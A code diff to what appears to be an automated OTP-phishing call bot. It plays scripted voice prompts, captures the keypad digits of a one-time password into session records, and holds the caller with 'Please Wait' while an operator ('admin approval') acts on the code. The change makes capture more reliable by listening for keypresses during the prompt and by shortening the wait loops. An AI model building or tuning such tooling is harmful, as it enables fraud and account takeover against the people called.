@@ -420,29 +420,21 @@ async def play_step1_with_retry(session_id: str, session: dict, call_id: str):
             {"$set": {"step1_play_count": play_count}}
         )
         
+        # Start DTMF capture BEFORE TTS so we can capture during voice
+        await start_dtmf_capture(call_id, max_length=1, timeout=30)
+        
+        # Play TTS
         await play_tts(call_id, step1_text, session.get("language", "en"))
         
-        # Wait for TTS to finish
+        # Wait and check for response every second (total 10 seconds after TTS starts)
         word_count = len(step1_text.split())
-        tts_wait = max(6, int(word_count / 2.5) + 2)
-        await asyncio.sleep(tts_wait)
+        total_wait = max(10, int(word_count / 2.5) + 5)  # TTS time + buffer
         
-        # Check again if already responded
-        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
-        if fresh_session and fresh_session.get("current_step", 1) >= 2:
-            logger.info(f"Step 1 responded during TTS play {play_count}")
-            return
-        
-        await emit_log(session_id, "info", "⏳ Waiting for user input (1 or 0)...")
-        await start_dtmf_capture(call_id, max_length=1, timeout=10)
-        
-        # Wait for response - shorter time
-        wait_time = 8 if play_count == 1 else 10
-        for _ in range(wait_time):
+        for _ in range(total_wait):
             await asyncio.sleep(1)
             fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
             if fresh_session and fresh_session.get("current_step", 1) >= 2:
-                logger.info(f"Step 1 responded during wait after play {play_count}")
+                logger.info(f"Step 1 responded during play {play_count}")
                 return
         
         if play_count == 1:
@@ -469,29 +461,21 @@ async def play_step2_with_retry(session_id: str, session: dict, call_id: str, ot
             {"$set": {"step2_play_count": play_count}}
         )
         
+        # Start DTMF capture BEFORE TTS so we can capture during voice
+        await start_dtmf_capture(call_id, max_length=otp_digits, timeout=30)
+        
+        # Play TTS
         await play_tts(call_id, step2_text, session.get("language", "en"))
         
-        # Wait for TTS to finish
+        # Wait and check for response every second (total 10 seconds after TTS)
         word_count = len(step2_text.split())
-        tts_wait = max(5, int(word_count / 2.5) + 2)
-        await asyncio.sleep(tts_wait)
+        total_wait = max(10, int(word_count / 2.5) + 5)
         
-        # Check again if already got OTP
-        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
-        if fresh_session and fresh_session.get("current_step", 1) >= 3:
-            logger.info(f"Step 2 responded during TTS play {play_count}")
-            return
-        
-        await emit_log(session_id, "info", f"⏳ Waiting for {otp_digits}-digit OTP...")
-        await start_dtmf_capture(call_id, max_length=otp_digits, timeout=20)
-        
-        # Wait for OTP - shorter time
-        wait_time = 12 if play_count == 1 else 15
-        for _ in range(wait_time):
+        for _ in range(total_wait):
             await asyncio.sleep(1)
             fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
             if fresh_session and fresh_session.get("current_step", 1) >= 3:
-                logger.info(f"Step 2 responded during wait after play {play_count}")
+                logger.info(f"Step 2 responded during play {play_count}")
                 return
         
         if play_count == 1:
@@ -514,23 +498,19 @@ async def play_step3_with_retry(session_id: str, session: dict, call_id: str):
             return
         
         await emit_log(session_id, "step", f"🎙️ Playing Step 3: Please Wait (Play {play_count}/2)...")
-        await play_tts(call_id, step3_text, session.get("language", "en"))
         
-        # Wait for TTS to finish
-        word_count = len(step3_text.split())
-        tts_wait = max(4, int(word_count / 2.5) + 2)
-        await asyncio.sleep(tts_wait)
+        # Play TTS
+        await play_tts(call_id, step3_text, session.get("language", "en"))
         
         await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
         
-        # Wait for admin response - shorter time
-        wait_time = 15 if play_count == 1 else 20
-        for _ in range(wait_time):
+        # Wait 10 seconds and check for admin response
+        for _ in range(10):
             await asyncio.sleep(1)
             fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
             status = fresh_session.get("status", "") if fresh_session else ""
             if status in ["completed", "step2"]:
-                logger.info(f"Step 3 admin responded during wait after play {play_count}")
+                logger.info(f"Step 3 admin responded during play {play_count}")
                 return
         
         if play_count == 1:
